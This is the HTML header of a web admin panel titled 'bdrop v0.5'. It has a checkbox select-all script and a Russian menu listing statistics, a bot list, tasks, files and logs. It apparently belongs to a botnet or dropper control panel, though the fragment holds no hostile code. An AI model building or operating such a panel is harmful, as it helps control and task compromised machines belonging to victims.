<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <title>bdrop v0.5 admin panel</title>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <link rel="shortcut icon" type="image/x-icon" href="favicon.ico" />
		<link rel="icon" type="image/x-icon" href="favicon.ico" />
        <link href="css/general.css" rel="stylesheet" type="text/css" />
		<script src="js/jquery.js" type="text/javascript"></script>
		<script type="text/javascript" src="js/formee.js"></script>
		<link rel="stylesheet" href="css/formee-structure.css" type="text/css" media="screen" />
		<link rel="stylesheet" href="css/formee-style.css" type="text/css" media="screen" />

        <script language="javascript" src="js/ajax.js"></script>
        <script language="javascript" src="js/tasks.js"></script>
        <script type="text/javascript">
        $(function() {
            $('#aSelectAll').click(function(event) {
                a = $('[id^=fi]:not(:checked)');
                b = $('[id^=fi]:checked');
                a.attr('checked', 'checked');
                b.removeAttr('checked');
                event.preventDefault();
            });
        });
        </script>
    </head>

<body>

<div id="top_menu">
    <div style="position: relative; left: 50%; top: 12px; text-align: left; margin-left: -512px; width: 1024px">
		<span><a href="?act=stats">Статистика</a></span>
		<span><a href="?act=bots">Список ботов</a></span>
        <span><a href="?act=tasks">Задания</a></span>
        <span><a href="?act=files">Файлы</a></span>
        <span><a href="?act=settings">Настройки</a></span>
        <span><a href="?act=logs">Логи</a></span>
	</div>
</div>

<div id="main_container">